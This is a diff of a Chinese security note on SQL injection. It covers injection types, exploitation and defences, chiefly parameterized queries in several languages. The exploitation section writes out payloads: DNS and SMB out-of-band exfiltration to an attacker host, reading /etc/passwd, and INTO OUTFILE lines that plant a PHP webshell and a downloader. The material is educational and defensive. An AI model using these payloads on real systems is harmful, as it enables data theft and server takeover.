@@ -1,12 +1,13 @@
 ### 简介
+
 SQL注入漏洞(SQL injection) - 对用户请求中的输入的参数值过滤不严(如动态拼接字符串)
 
 ### 类型
 
 * boolean-based blind 基于布尔的盲注
 * time-based blind 基于时间的盲注
-* error-based 基于报错
-* UNION query-based 基于联合查询
+* error-based 基于报错的SQL注入
+* UNION query-based 基于联合查询的SQL注入
 * stacked queries 堆叠查询
 * out-of-band 带外
 
@@ -48,57 +49,131 @@ test.get_content() #获取第一列第一个字段内容
 
 [SQLi漏洞的各种具体利用方式【漏洞危害】 - The SQL Injection Knowledge Base](https://websec.ca/kb/sql_injection#MySQL_Writing_Files)
 
-* 数据泄露 - 带外通道得到数据(Out Of Band Channeling)
+* 数据泄露 - 通过"带外通道"获取数据(Out Of Band Channeling)
   * DNS Requests - `LOAD_FILE`可以发出DNS请求
     * MySQL `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\abc'));`
   * SMB Requests - `INTO OUTFILE`可以发出SMB请求
     * MySQL `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
-* 读取文件内容(Reading Files) Files can be read if the user has FILE privileges.
-  * LOAD_FILE()
-    * MySQL `SELECT LOAD_FILE('/etc/passwd');`
-    * MySQL `SELECT LOAD_FILE(0x2F6574632F706173737764);`
-* 写入文件(Writing Files) Files can be created if the user has FILE privileges.
-  * MySQL `INTO OUTFILE` 或 `INTO DUMPFILE`
-    * Get WebShell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` 访问WebShell `http://localhost/shell.php?c=cat%20/etc/passwd`
-    * Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
+* 文件读写 - 前提:当前数据库user有FILE权限
+  * 读取文件(Reading Files)
+    * MySQL - `LOAD_FILE()`
+    * 例1 `SELECT LOAD_FILE('/etc/passwd');` `SELECT LOAD_FILE(0x2F6574632F706173737764);`
+  * 写入文件(Writing Files)
+    * MySQL - `INTO OUTFILE` 或 `INTO DUMPFILE`
+    * 例1 Get WebShell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` 访问WebShell `http://localhost/shell.php?c=cat%20/etc/passwd`
+    * 例2 Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
 
 
 ### SDL - 防御与修复方案
 
-* 1. 预编译语法/参数化查询
+* 重点检测
+  * 无法使用"预编译语句"的情况
+    * `order by`
+    * `limit`
+  * 宽字节注入
+  * ...
+  
 
+* 1.使用带有"参数化查询"的"预编译语句"
+
+"参数化查询"(Parameterized Query 或 Parameterized Statement)的原理:强制开发人员先定义好所有SQL代码，然后将每个"实际参数"传入并查询。这种编码风格使数据库能够区分"代码"和"数据".
+
+
+PHP - [使用PDO(PHP Data Objects)](https://php.net/manual/en/book.pdo.php) 支持任意数据库
 ```
-//PHP
-//PDO扩展中的 bindParam()方法绑定参数
+// PDO常用函数
+// PDOStatement::bindColumn — Bind a column to a PHP variable
+// PDOStatement::bindParam — Binds a parameter to the specified variable name   bindParam()方法 可进行 强类型参数化查询(strongly typed parameterized queries)
+// PDOStatement::bindValue — Binds a value to a parameter
+
+
+// 实例化数据抽象层对象
+$db = new PDO('pgsql:host=127.0.0.1;port=5432;dbname=testdb'); 
+// 对 SQL 语句执行 prepare，得到 PDOStatement 对象 
+$stmt = $db->prepare('SELECT * FROM "myTable" WHERE "id" = :id AND "is_valid" = :is_valid'); 
+// 绑定参数
+$stmt->bindValue(':id', $id); 
+$stmt->bindValue(':is_valid', true); 
+// 查询
+$stmt->execute(); 
+// 输出数据
+foreach($stmt as $row) { 
+var_dump($row); 
+}
 ```
 
+PHP - 使用MySQLi (仅支持MySQL数据库)
 ```
-//.NET
-//SqlCommand()
-//OleDbCommand()
-```
-
-```
-//JAVA
-PreparedStatement()
-//Hibernate
-createQuery()
+$stmt = $dbConnection->prepare('SELECT * FROM employees WHERE name = ?');
+$stmt->bind_param('s', $name);
+$stmt->execute();
+$result = $stmt->get_result();
+while ($row = $result->fetch_assoc()) {
+    // do something with $row
+}
 ```
 
+
+.NET
 ```
-//SQLite
+// "参数化查询"
+// 如 使用带有"绑定变量"的SqlCommand()函数 OleDbCommand()函数
+
+String query = "SELECT account_balance FROM user_data WHERE user_name = ?";
+try {
+  OleDbCommand command = new OleDbCommand(query, connection);
+  command.Parameters.Add(new OleDbParameter("customerName", CustomerName Name.Text));
+  OleDbDataReader reader = command.ExecuteReader();
+  // …
+} catch (OleDbException se) {
+  // error handling
+} 
+```
+
+
+JAVA - 原生函数
+```
+// 预编译语句PreparedStatement()  需要和"参数绑定"一起使用
+
+// This should REALLY be validated too
+String custname = request.getParameter("customerName"); 
+// Perform input validation to detect attacks
+String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
+PreparedStatement pstmt = connection.prepareStatement( query );
+pstmt.setString( 1, custname); 
+ResultSet results = pstmt.executeQuery( );
+```
+
+JAVA - Hibernate框架的`.createQuery()`函数与`.setParameter()`
+```
+// Hibernate Query Language (HQL) - Prepared Statement
+// 在Hibernate中，绑定变量(bind variables) 被称为 "Named Parameters"
+
+//不安全的HQL语句查询
+//First is an unsafe HQL Statement
+Query unsafeHQLQuery = session.createQuery("from Inventory where productID='"+userSuppliedParameter+"'");
+
+//安全的HQL语句查询
+//Here is a safe version of the same query using named parameters
+Query safeHQLQuery = session.createQuery("from Inventory where productID=:productid");
+safeHQLQuery.setParameter("productid", userSuppliedParameter);
+```
+
+SQLite
+```
 sqlite3_prepare()
 ```
 
+Golang
 ```
-// Golang(Postgres)
+// 对Postgres数据库
 // This is for Postgres. Other SQL variants may use the ? character.
 db.Exec("INSERT INTO users(name, email) VALUES($1, $2)",
   "Jon Calhoun", "jon@calhoun.io")
 ```
 
 ```
-// Golang(mysql)
+// 对mysql数据库
 // http://mindbowser.com/golang-go-database-sql/
 package main
  import (
@@ -149,7 +224,9 @@ try {
 }
 ```
 
-* 3. 白名单输入验证(White List Input Validation)
+* 3. 白名单输入验证(White List Input Validation) 
+
+如`order by`和`limit`子句，无法使用"绑定变量"(bind variable)，就需要"白名单输入验证"
 
 * 4. 数据库用户权限最小化(Least Privilege)
 
